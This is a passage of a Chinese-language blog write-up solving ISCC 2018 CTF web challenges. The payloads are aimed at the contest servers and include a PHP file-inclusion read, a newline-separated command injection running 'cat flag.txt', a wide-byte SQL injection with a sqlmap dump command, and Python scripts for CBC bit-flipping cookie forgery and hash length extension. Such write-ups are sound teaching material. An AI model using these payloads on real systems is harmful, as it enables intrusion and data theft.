alt="mark"><br><strong>看到xss便首先尝试在输入框里提交XSSPaylaod，结果发现根本找不到输出点，不管提交多少次都是”加油再试一次”，然后发现页面有一串字符非常像base64编码</strong><br><code>ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0</code><br><strong>base64解码了一下，发现是XSSpayload，里面有我们要的key</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/2bJ3AL2hc5.png?imageslim" alt="mark"><br><strong>因为key的16进制中有00，代表结束符（截断），所以要将key中的00字符都删掉，才能将key复制下来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/IKHk1diJmC.png?imageslim" alt="mark"><br><strong>key:/%nsfocusXSStest%/</strong></p><p><strong>key不是flag，将<code>/%nsfocusXSStest%/</code>提交到页面输入框才能弹出来flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/Je6hfIh43H.png?imageslim" alt="mark"><br><strong>建议出题人将这题放到杂项会比较合适，有点挂羊头卖狗肉的意思</strong></p><p><code>flag{Hell0World}</code></p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p><strong>HINT：好像有个文件忘记删了</strong></p><p><strong>自己的字典太垃圾，啥也没扫出来，经过一个表哥强大的字典发现扫出了<code>index.php.txt</code>，内容如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/jkblH5Kk5G.png?imageslim" alt="mark"></p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;]) )    die($_403);foreach ($_GET as $k =&gt; $v){    $$k = $$v;}foreach ($_POST as $k =&gt; $v){    $$k = $v;}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><p><strong>进行一波代码审计发现考察的是php变量覆盖，构造payload</strong><br><code>http://118.190.152.202:8009/index.php?_200=flag</code></p><p><strong>带上POST参数</strong></p><p><code>flag=</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/IdjaIcj9CF.png?imageslim" alt="mark"><br><strong>我来讲解一下详细的过程，首先代码要求必须有POST参数，而且POST参数的参数名必须为flag，这样才可以到变量覆盖的那一步,接着提交GET参数<code>_200=flag</code>,php代码遍历<code>$_GET</code>数组执行的便是<code>$_200=$flag</code>,也就是将变量<code>$flag</code>的值复制给<code>$_200</code>,覆盖原先变量<code>$_200</code>的值,此时变量<code>$_200</code>的值为<code>$flag</code>中的值，接着php遍历$_POST数组，我们提交的POST参数为<code>flag=空(任意值)</code>，于是将POST的值复制给<code>$flag</code>值，覆盖原先的<code>$flag</code>值，<code>$_POST[&quot;flag&quot;]</code>便会和$flag值相等，都为空(任意值)，最后输出变量<code>$_200</code>的值，也就是原先$flag中的flag</strong></p><p><code>flag: ISCC{taolu2333333....}</code></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p><strong>HINT:没过滤好啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8iAckg2jJl.png?imageslim" alt="mark"><br><code>http://118.190.152.202:8008/index.php?f=articles&amp;id=1</code></p><p><strong>一开始以为id参数没过滤好，于是尝试了注入，结果被坑了，原来是f参数没过滤好，存在文件包含，通过文件包含漏洞使用php伪协议读取<code>index.php</code></strong></p><p><code>payload:http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=1</code><br><strong>payload中的php要大写，否则会被拦截</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/0EI1Ab470E.png?imageslim" alt="mark"><br><strong>得到一串base64，解码得到源码，源码中有flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8H5eamIhbg.png?imageslim" alt="mark"><br><code>flag:ISCC{LFIOOOOOOOOOOOOOO}</code></p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/C08eGC3cDg.png?imageslim" alt="mark"><br><strong>要求ip为本机ip，尝试Referer和X-forwarded-For都不行，最后搜索了一番，发现伪造ip还可以用Client-ip</strong></p><p><strong>将ip伪造成127.0.0.1即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/kA4aAedK42.png?imageslim" alt="mark"></p><p><code>flag:ISCC{iscc_059eeb8c0c33eb62}</code></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p><strong>HINT:我都过滤了，看你怎么绕。</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/6kbkCADHgl.png?imageslim" alt="mark"><br><strong>看到这样一句话：请ping我的IP 看你会ping通吗</strong></p><p><strong>尝试</strong></p><p><code>http://118.190.152.202:8018/?ip=118.190.152.202</code></p><p><strong>发现可以执行ping命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/1CA2g26002.png?imageslim" alt="mark"><br><strong>猜测后台php代码应该如下,类似于dvwa中的命令执行</strong></p><p><code>shell_exec( &#39;ping  &#39; . waf($_GET[ip]) )</code><br><strong>尝试在ping命令后执行多条命令，发现<code>&amp;</code>，<code>&amp;&amp;</code>，<code>|</code>都不行，最后测试发现使用<code>%0A</code>可以绕过,读取flag.txt payload</strong></p><p><code>http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20flag.txt</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/5L8D3L0D46.png?imageslim" alt="mark"><br><strong>读取index.php payload</strong><br><code>http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20index.php</code><br><strong>可以看到源码里正如我们之前猜测的那样</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/2mDam747m1.png?imageslim" alt="mark"></p><p>请ping我的IP 看你会ping通吗</p><pre><code>PING www.a.shifen.com (180.149.132.151) 56(84) bytes of data.64 bytes from 180.149.132.151: icmp_seq=1 ttl=51 time=23.8 ms--- www.a.shifen.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 23.871/23.871/23.871/0.000 ms &apos;&apos;,        &apos;;&apos; =&gt; &apos;&apos;,        &apos;|&apos; =&gt; &apos;&apos;,        &apos;-&apos;  =&gt; &apos;&apos;,        &apos;$&apos;  =&gt; &apos;&apos;,        &apos;(&apos;  =&gt; &apos;&apos;,        &apos;)&apos;  =&gt; &apos;&apos;,        &apos;`&apos;  =&gt; &apos;&apos;,        &apos;||&apos; =&gt; &apos;&apos;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {        // Windows        $cmd = shell_exec( &apos;ping  &apos; . $target );    }    else {        // *nix        $cmd = shell_exec( &apos;ping  -c 1 &apos; . $target );    }    echo  &quot;{$cmd}&quot;;?&gt;</code></pre><p><strong>当然这到题也有非常规解法，既然要用命令执行去读取flag.txt，不如直接访问网站根目录下的<code>flag.txt</code>就能得到flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/d00m3BBaJA.png?imageslim" alt="mark"><br><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/9DH41ccHi2.png?imageslim" alt="mark"><br><strong>题目说<code>Please give me username or password!</code></strong></p><p><strong>那在url后添加GET参数username与password</strong><br><code>http://118.190.152.202:8017/?username=&amp;&amp;password=</code></p><p><strong>再查看源代码可以看到html注释里面有个index.php.txt</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/HHEbkm3GJI.png?imageslim" alt="mark"></p><p><strong>访问index.php.txt,发现源代码，又是一道代码审计题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/G77749Jh9h.png?imageslim" alt="mark"></p><pre><code>&lt;?phperror_reporting(0);$flag = &quot;***********&quot;;    if(isset($_GET[&apos;username&apos;])){    if (0 == strcasecmp($flag,$_GET[&apos;username&apos;])){    $a = fla;    echo &quot;very good!Username is right&quot;;    }    else{    print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;}}elseprint &apos;Please give me username or password!&apos;;if (isset($_GET[&apos;password&apos;])){    if (is_numeric($_GET[&apos;password&apos;])){        if (strlen($_GET[&apos;password&apos;]) &lt; 4){            if ($_GET[&apos;password&apos;] &gt; 999){            $b = g;            print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;        }else             print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;        }else        print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;    }else    print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;}if ($a.$b == &quot;flag&quot;)    print $flag;?&gt;</code></pre><p><strong>可以看到只要绕过对username和password的过滤便能得到flag</strong></p><p><strong>strcasecmp的绕过可以利用数组，因为php的隐式类型转换的特性，strcasecmp这个函数在比较时会发生隐式类型转换，数组会被转为字符串格式，也就是Array，所以两个字符串不相等，那么该函数就会返回False，又因为将False与0以双等号（不严格的比较）进行比较发生了一次隐私类型转换，所以结果为真，从而绕过，后面要求数字长度小于4且大于999可以用php中的科学计数法绕过,构造payload</strong></p><p><code>http://118.190.152.202:8017/?username[]=&amp;&amp;password=1e9</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/jad86261b6.png?imageslim" alt="mark"><br><code>flag{ISCC2018_Very_GOOD!}</code></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/CdD15BHHI4.png?imageslim" alt="mark"><br><strong>找到一个可能存在注入的连接</strong><br><code>http://118.190.152.202:8015/index.php?id=1</code></p><p><strong>猜测id参数可能存在注入，加单引号和双引号页面均返回正常并不会报错，于是猜测引号可能被转义了，尝试宽字节注入</strong></p><p><code>http://118.190.152.202:8015/index.php?id=1%df&#39;</code></p><p><strong>发现页面返回不正常</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8C724Eil08.png?imageslim" alt="mark"><br><strong>and逻辑判断确认存在注入</strong></p><p><code>http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=1%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/hACeHiC64h.png?imageslim" alt="mark"><br><code>http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=2%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/h6DJ3HlLag.png?imageslim" alt="mark"><br><strong>order by 测试出列数为8，union查询确定出注入回显的位置</strong></p><p><code>http://118.190.152.202:8015/index.php?id=-1%df&#39; union select 1,2,3,4,5,6,7,8%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/c4mdGEJk69.png?imageslim" alt="mark"><br><strong>接下来可以union手工注入，也可以用sqlmap跑，sqlmap跑的时候要使用tamper脚本<code>unmagicquotes.py</code>来绕过单引号转义过滤，为了方便直接上sqlmap，获取flag的命令</strong></p><p><code>sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1&#39;&quot; --dump -C &quot;flag&quot; -T &quot;admins&quot; -D &quot;baji&quot; --tamper=&quot;unmagicquotes.py&quot;</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/mGiCmLAl23.png?imageslim" alt="mark"><br><code>flag:Y0u_@@33w_dxxmn_9rf0Od</code></p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><strong>HINT:随意开火</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/j0j6jg0BcB.png?imageslim" alt="mark"><br><strong>这道题一开始就觉得是文件包含，但是使用php协议读文件时发现一直出现File not found，一直不知为何，直到谷歌搜出了<a href="http://www.yqxiaojunjie.com/index.php/archives/27/" title="类似的一道题" target="_blank" rel="external">类似的一道题</a>才找到思路，这里的思路大概一样，只要绕过正则表达式即可，经过模糊测试，发现</strong></p><p><code>http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=../flag.php</code><br><strong>可以读到flag.php中的flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/f6GDKF8GmD.png?imageslim" alt="mark"><br><code>flag{1ntere5ting_PHP_Regu1ar_express1onssssss}</code><br><code>http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=show.php</code><br><strong>可以读取show.php查看它的过滤</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/0DjH8FE7G9.png?imageslim" alt="mark"></p><pre><code>&lt;?phperror_reporting(0);ini_set(&apos;display_errors&apos;,&apos;Off&apos;);include(&apos;config.php&apos;);$img = $_GET[&apos;img&apos;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&apos;jpg&apos;) !== false)    {        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp;preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)        {            die(&apos;File not found.&apos;);        }        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&apos;Content-Type: image/jpeg&apos;);        $data = get_contents($img);        echo $data;    }    else    {        die(&apos;File not found.&apos;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><p><strong>可以看到源码印证了我们之前的猜想</strong></p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p><strong>打开后是一个登陆页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/2FHFaBllla.png?imageslim" alt="mark"><br><strong>出于习惯首先查看源代码，结果发现泄露了index.php的源码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/cd755b6fif.png?imageslim" alt="mark"><br><strong>查看源代码，可以看出又是一道代码审计题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/3a2cLcLmed.png?imageslim" alt="mark"><br><strong>代码如下</strong></p><pre><code>&lt;?phpinclude &apos;sqlwaf.php&apos;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();    function get_random_iv(){    $iv=&apos;&apos;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;){        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;    }else{        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;    }    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;    die();}function check_login(){    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];        }else{            die(&quot;ERROR!&quot;);        }    }}    if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) {  $username=waf((string)$_POST[&apos;username&apos;]);  $password=waf((string)$_POST[&apos;password&apos;]);  if($username === &apos;admin&apos;){        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);    }else{        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);        login($info);        show_homepage();    }}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&apos;username&apos; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&apos;password&apos; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>来看代码的主要执行过程与用户数据流的流向</strong></p><p><strong>首先，如果存在有用户<code>POST</code>传递过来的<code>username</code>与<code>password</code>，那就接收用户输入的<code>username</code>与<code>password</code>，将用户输入的内容转换为字符串类型然后带入waf函数进行过滤检查处理（应该是过滤一些危险字符），之后使用<code>===</code>检查<code>username</code>的值是否为<code>admin</code>，如果相等直接输出<code>You are not real admin!</code>到页面并且结束，否则将<code>username</code>与<code>password</code>存入数组然后带入login函数，通过代码可以看出login函数的主要作用，将传入的存有<code>username</code>与<code>password</code>的数组进行序列化处理后再使用php中的<code>openssl_encrypt</code>函数进行<code>aes-128-cbc</code>加密，加密的初始化向量为随机生成的16字节的字符串，之后将传入的用户名传入服务器中session文件（文件名为<code>28r835361idfvf2g5judamo844</code>）中的<code>username</code>变量中，将初始化向量与加密结果进行base64编码后分别存入cookie中的<code>iv</code>与<code>cipher</code>中，之后cookie就作为该用户的登陆凭证，简单来说，就是如果用户名不等于<code>admin</code>就登陆成功并且将用户名存入服务器的session变量中，之后setcookie，然后进入用户界面，此处使用<code>show_homepage</code>函数判断，这个函数会判断<code>session</code>中的<code>username</code>是否为<code>admin</code>，如果为<code>admin</code>，那就登陆成功并输出flag，否则就以普通用户登录</strong></p><p><strong>如果发现服务器session文件中的username变量已被设置，说明之前有用户登录了，就不使用login函数进行进行登陆检查，而是使用<code>check_login</code>函数进行用户身份检查，通过代码可以看出<code>check_login</code>函数的主要作用，检查cookie中是否设置有<code>cipher</code>和<code>iv</code>，如果有，就对cookie中的<code>cipher</code>与<code>iv</code>进行base64解码，然后使用php中的<code>openssl_decrypt</code>函数进行<code>aes-128-cbc</code>解密，将解密的结果进行反序列化处理为数组，之后将数组中的<code>username</code>赋值给<code>session</code>中的<code>username</code>，之后进入用户登录界面，再次调用<code>show_homepage</code></strong></p><p><strong>来分析一下整个逻辑过程</strong></p><p><strong>简单来说，要求输入的用户名不能为<code>admin</code>才能登陆成功，但是进行用户身份检查时需要<code>$_SESSION</code>中的<code>username</code>必须等于<code>admin</code>才能登陆成功，于是想到了可以首先以一个用户名不是<code>admin</code>的用户登录，设置<code>$_SESSION[&#39;username&#39;]</code>，之后刷新登陆页面，将会带上生成的cookie进入<code>check_login</code>函数,我们可以修改cookie中的cipher与iv，使其经过aes-128-cbc解密反序列化后将<code>$info[&#39;username&#39;]</code>的值变为<code>admin</code>即可覆盖第一次登陆后设置的<code>$_SESSION[&#39;name&#39;]</code>，将其变为<code>admin</code>,此时经过<code>show_homepage</code>后就会是<code>admin</code>并且输出flag</strong></p><p><strong>在这里加密解密的密钥是未知的，iv初始化向量是随机生成的，导致我们不能直接利用加密算法生成cookie，于是想到了一种名为<a href="http://blog.leej.me/2017/05/15/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81CBC%E5%8A%A0%E5%AF%86%E7%BC%BA%E9%99%B7/" title="CBC翻转字节攻击" target="_blank" rel="external">CBC翻转字节攻击</a>的方法，该攻击可以在不知道密钥的前提下，通过修改密文中某一处的字节达到修改部分明文的目的，具体过程如下，首先来看AES的CBC模式的加密解密过程，分组长度为16字节</strong></p><p><strong>加密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/5DL0a7l7mC.jpg?imageslim" alt="mark"><br><strong>解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/K4KH31g4fJ.jpg?imageslim" alt="mark"><br><strong>所谓的CBC翻转字节攻击就是通过修改某一分组的密文，去修改其下一分组的明文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/j3aiLD6Aaf.png?imageslim" alt="mark"><br><strong>比如明文分组如下，以题目举例</strong></p><pre><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;}</code></pre><p><strong>要将<code>Admin</code>修改为<code>admin</code>，只需修改加密后第一个分组中的第10个字节，也就是对应<code>A</code>所在位置的<code>&quot;</code>的密文就可以</strong></p><p><strong>首先要以Admin登陆，获取Set-Cookie中的cipher与iv，cipher里面存放着将上面那串字符串加密的密文，iv为随机生成的16位字符串，作为加密解密的初始化向量</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/mmBJ5lGEJB.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/E46C9Ce2i8.png?imageslim" alt="mark"></p><pre><code>iv：pO%2FPPYF9sNQq9oGENmDdFA%3D%3Dcipher：bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D</code></pre><p><strong>首先修改密文的第一个分组的第十个字节</strong></p><pre><code>import urllibimport base64#a:2:{s:8:&quot;userna#me&quot;;s:5:&quot;Admin&quot;;#s:8:&quot;password&quot;;s#:6:&quot;123456&quot;;}cipher=&quot;bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D&quot;cipher=base64.b64decode(urllib.unquote(cipher))newcipher=cipher[0:9]+chr(ord(cipher[9])^ord(&apos;A&apos;)^ord(&apos;a&apos;))+cipher[10:]print &quot;cipher:\n%s&quot;%(urllib.quote(base64.b64encode(cipher)))print &quot;new cipher:\n%s&quot;%(urllib.quote(base64.b64encode(newcipher)))</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/m1eaF1BI4h.png?imageslim" alt="mark"><br><strong>我来解释一下这段代码</strong></p><pre><code>首先需要明白一个前提异或运算相同为0，不同为1，所以推导出：一个字符和其本身异或结果为0，一个字符和0异或结果为其本身解密（cipher[9+16]）^cipher[9]=&apos;A&apos;(这是正常的解密过程)解密（cipher[9+16]）^cipher[9]^&apos;A&apos;^&apos;a&apos;=&apos;a&apos;（将A变为a，就要将第一分组中的第十个字节cipher[9]进行cipher[9]^&apos;A&apos;^&apos;a&apos;改变）</code></pre><p><strong>此时cipher变为了</strong></p><pre><code>bq1cO9PgjsrNf%2B1iItSFPsyT/taue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7/Du5pSgPzuq339vT4EWNfQ%3D%3D</code></pre><p><strong>刷新登陆后的页面，将cookie中的cipher改为修改后的cipher</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/KKD543a6Hf.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/IKkhEdf592.png?imageslim" alt="mark"><br><strong>将返回<code>base64_decode(&#39;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&#39;) can&#39;t unserialize</code>的错误，因为如果修改第一组密文中的某个字节，初始化向量不变也会导致第一组明文解密时发生改变，从而导致解密出的序列化的格式发生改变而导致反序列化失败，所以还要根据这串返回的base64重新生成新的iv，让解密出的第一个分组的明文还原成原先的明文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/2c03bBEIIF.png?imageslim" alt="mark"></p><pre><code>import urllibimport base64iv=&quot;pO%2FPPYF9sNQq9oGENmDdFA%3D%3D&quot;iv=base64.b64decode(urllib.unquote(iv))jiamingwen = base64.b64decode(urllib.unquote(&apos;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&apos;))mingwen = &apos;a:2:{s:8:&quot;userna&apos;newiv = &apos;&apos;for i in range(0,16):    newiv += chr(ord(mingwen[i])^ord(jiamingwen[i])^ord(iv[i])) print urllib.quote(base64.b64encode(newiv))</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/1KemB4cciD.png?imageslim" alt="mark"><br><strong>同样的，解释一下这段代码</strong></p><pre><code>有个前提如果c=a^b那么a=c^b，b=a^c    因为：iv^解密（假密文）=假明文iv^解密（假密文）^假明文=0(假明文^假明文=0)所以：iv^解密（假密文）^假明文^明文=明文（0^明文=明文）又因为需要达到：newiv^解密（假密文）=明文所以：newiv=iv^假明文^明文    </code></pre><p><strong>所以新的iv变为</strong></p><pre><code>dR9UMoe8drNhp9pRsl3%2Bxw%3D%3D</code></pre><p><strong>然后将cookie中的cipher和iv同时改为新生成的即可，这样的话解密后只会将第二组明文的<code>A</code>变为<code>a</code>，而且第一分组解密出的明文并不会发生改变，序列化格式也自然不会改变，这样就可以反序列化成功，然后将<code>$_SESSION[&#39;username&#39;]</code>重新赋值为解密出的<code>admin</code>明文,然后绕过验证输出flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/CKJ6Dcd12A.png?imageslim" alt="mark"></p><pre><code>flag：ISCC{123dasd89as10aas}</code></pre><h2 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h2><p><strong>HINT：那么长的秘钥，要爆破到什么时候啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/L8D33j2aBJ.png?imageslim" alt="mark"><br><strong>又是一到代码审计题</strong></p><pre><code>&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&apos;username&apos;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&apos;verify&apos;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><p><strong>可以看出这道题是考察hash长度扩展攻击的，对于这种攻击方式原理自己还没有完全搞懂，于是就把做题方法记录一下</strong></p><p><strong>首先，需要在linux中安装一个名为HashPump的工具，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。下面是安装方法</strong></p><pre><code>git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/djl8cGgHb7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/h9K28hGb3B.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/EK41J2h9cF.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/2a476FI9DG.png?imageslim" alt="mark"><br><strong>之后POST提交username为guest，运行hashpump，将burp抓包抓到的cookie中的verify与len输入，然后输入数据和要追加的数据（guest与admin）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/4f00bhjilb.png?imageslim" alt="mark"><br><strong>之后便会生成新的数据与hash值，分别将username与cookie中的verify改为hashpump新生成的值即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/IIa4EJkA21.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/E5EjHdh6h3.png?imageslim" alt="mark"></p><pre><code>flag：ISCC{MD5_1s_n0t_5afe}</code></pre><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/4C6ld3If9m.png?imageslim" alt="mark"><br><strong>打开后可以看到代码如下</strong></p><pre><code>&lt;html&gt;&lt;body&gt;&lt;form action=&quot;md5.php&quot;  method=&quot;post&quot; &gt;    用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;    密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt;    &lt;input type=&quot;submit&quot; 